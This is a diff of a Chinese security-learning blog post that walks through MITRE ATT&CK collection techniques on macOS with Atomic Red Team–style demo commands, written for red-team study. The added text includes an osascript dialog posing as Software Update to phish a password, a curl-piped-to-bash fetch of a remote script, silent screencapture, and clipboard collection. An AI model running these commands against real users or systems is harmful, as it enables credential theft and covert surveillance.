@@ -1,4 +1,4 @@
-﻿---
+---
 layout: post
 title: 跟着ATT&CK学安全之collection
 excerpt: "跟着ATT&CK学安全之collection"
@@ -62,3 +62,79 @@ import -window root
 powershell -executionpolicy bypass -command $PathToAtomicsFolder\T1114\Get-Inbox.ps1 -file #{output_file}
 ```
 应该可以
+
+## macos
+
+## T1560.001 - Archive via Utility
+
+红队使用第三方提供的加密或者压缩工具来进行数据封存，demo如下
+
+###### Demo1 使用zip
+
+```
+zip #{output_file} #{input_files}
+```
+
+###### Demo2 使用gzip
+
+```
+test -e #{input_file} && gzip -k #{input_file} || (echo '#{input_content}' >> #{input_file}; gzip -k #{input_file})
+```
+
+Demo3 使用tar
+
+```
+tar -cvzf #{output_file} #{input_file_folder}
+```
+
+## T1115 - Clipboard Data
+
+红队可以收集剪切板的数据，Demo如下
+
+###### Demo1 通过命令收集剪切板的数据
+
+```
+echo ifconfig | pbcopy
+$(pbpaste)
+```
+
+## T1056.002 - GUI Input Capture
+
+红队可以制作一个伪装的GUI来诱导用户输入凭证，Demo如下
+
+###### Demo1 AppleScript - Prompt User for Password
+
+```
+osascript -e 'tell app "System Preferences" to activate' -e 'tell app "System Preferences" to activate' -e 'tell app "System Preferences" to display dialog "Software Update requires that you type your password to apply changes." & return & return  default answer "" with icon 1 with hidden answer with title "Software Update"'
+```
+
+PS:这个很有意思
+
+## T1074.001 - Local Data Staging
+
+红队可以分阶段的传输数据，Demo如下
+
+Demo1
+
+```
+curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | bash -s > #{output_file}
+```
+
+## T1113 - Screen Capture
+
+红队可以利用屏幕录制来收集信息，通过系统自带的工具就可以实现，例如`CopyFromScreen`, `xwd`, 和 `screencapture`，Demo如下
+
+###### Demo1 screencapture
+
+```
+screencapture #{output_file}
+```
+
+###### Demo2 screencapture 静默运行
+
+```
+screencapture -x #{output_file}
+```
+
+
+
